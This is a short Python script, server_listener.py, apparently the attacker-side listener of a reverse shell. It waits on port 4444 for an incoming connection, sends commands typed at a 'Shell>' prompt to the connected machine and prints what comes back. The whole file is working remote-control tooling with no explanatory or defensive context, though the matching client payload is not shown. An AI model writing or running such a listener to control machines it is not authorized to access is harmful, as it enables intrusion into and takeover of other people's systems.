# server_listener.py
import socket

s = socket.socket()
s.bind(("0.0.0.0", 4444))
s.listen(1)
print("[*] Listening on port 4444...")

conn, addr = s.accept()
print(f"[+] Connection from {addr}")

while True:
    cmd = input("Shell> ")
    conn.send(cmd.encode())
    if cmd.lower() == "exit":
        break
    output = conn.recv(4096).decode()
    print(output)

conn.close()
